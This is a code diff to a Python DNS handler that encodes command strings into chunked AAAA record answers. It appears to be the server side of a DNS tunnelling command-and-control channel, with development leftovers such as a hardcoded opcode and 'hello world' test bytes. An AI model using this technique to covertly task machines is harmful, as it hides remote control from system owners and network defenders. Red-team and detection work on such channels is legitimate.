@@ -9,7 +9,7 @@ import logging
 class Records(Enum):
     """ The types of records the DNSHandler can currently encode """
     TXT = (QTYPE.TXT, TXT, 253)
-    AAAA = (QTYPE.AAAA, AAAA, 16)
+    AAAA = (QTYPE.AAAA, AAAA, 13)
 
 class Domains(Enum):
     """ The valid subdomains used as function indicators by Resolution """
@@ -77,7 +77,7 @@ class DNSHandler(ProtocolHandler):
         except DNSError as e:
             self.logger.debug(f"[{self.ip}] encrypt: DNS Packet Malformed: {str(e)}")
 
-        return 0
+        return 1
 
     def respond(self, raw_request, port, cmd):
         """
@@ -135,13 +135,37 @@ class DNSHandler(ProtocolHandler):
                 packet.add_answer(answer)
 
         def AAAA(rr_type, packet):
-            _, rr_constructor, _ = Records.AAAA.value
-            packet.add_answer(
-                RR(rname=record.get_q().get_qname(),
-                    rtype=rr_type,
-                    rclass=CLASS.IN,
-                    rdata=rr_constructor([1 for x in range(16)]),
-                    ttl=1337))
+            cmd = command.command
+            _, constructor, msg_size = Records.AAAA.value
+            chunks = [cmd[i:i+msg_size] for i in range(0, len(cmd), msg_size)]
+            self.logger.debug(chunks)
+
+            #opcode = 0 if command.type == CommandType.NOP else 3
+            opcode = 3
+            if opcode == 0:
+                packet.add_answer(
+                    RR(
+                        rname=record.get_q().get_qname(),
+                        rtype=rr_type,
+                        rclass=CLASS.IN,
+                        # Send a nop packet of seq num 0, and expected length 1
+                        rdata=constructor([0, 1, 0] + [0 for _ in range(13)]),
+                        ttl=1337))
+            else:
+                for i, chunk in enumerate(chunks):
+                    #data = [opcode, i, len(chunks)] + [ord(c) for c in chunk]
+                    data = [3, 1, 0] + [ord(c) for c in chunk] #currently doing edns
+                    # Pad the data to 16 bytes
+                    data += [0 for _ in range(16 - len(data))]
+                    answer = RR(
+                            rname=record.get_q().get_qname(),
+                            rtype=rr_type,
+                            rclass=CLASS.IN,
+                            # 1st byte indicates data, second byte is seq number, 3rd is num transmission packets
+                            rdata=constructor(data),
+                            ttl=1337)
+                    packet.add_answer(answer)
+            
 
         rr_type = record.questions[0].qtype
         # Generate skeleton question for packet
@@ -175,7 +199,7 @@ class DNSHandler(ProtocolHandler):
             return RR(rname=record.get_q().get_qname(),
                 rtype=rr_type,
                 rclass=CLASS.IN,
-                rdata=rr_constructor([1 for x in range(16)]),
+                rdata=rr_constructor([1, 1, 0, 104, 101, 108, 108, 111, 32, 119, 111, 114, 108, 100, 0, 0]),
                 ttl=1337)
 
         rr_type = record.questions[0].qtype
